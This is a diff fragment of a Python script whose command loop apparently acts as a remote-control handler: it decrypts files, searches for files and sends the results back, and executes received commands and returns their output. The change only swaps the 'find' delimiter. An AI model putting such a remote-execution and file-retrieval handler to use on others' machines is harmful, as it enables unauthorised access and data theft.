@@ -382,11 +382,11 @@ while 1:
             cipher = AES.new(key, AES.MODE_CBC, IV)
             Decrypt(fileToDeProtect, cipher, HEX, key, IV)
     elif inText.startswith("find"):
-        if len(inText.split(":")) == 3:
-            listFile = FindFile(inText.split(":")[1],inText.split(":")[2])
+        if len(inText.split("|")) == 3:
+            listFile = FindFile(inText.split("|")[1],inText.split("|")[2])
             SendData(listFile)
         else:
-            SendData("usage: find:path:type")
+            SendData("usage: find|path|type")
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
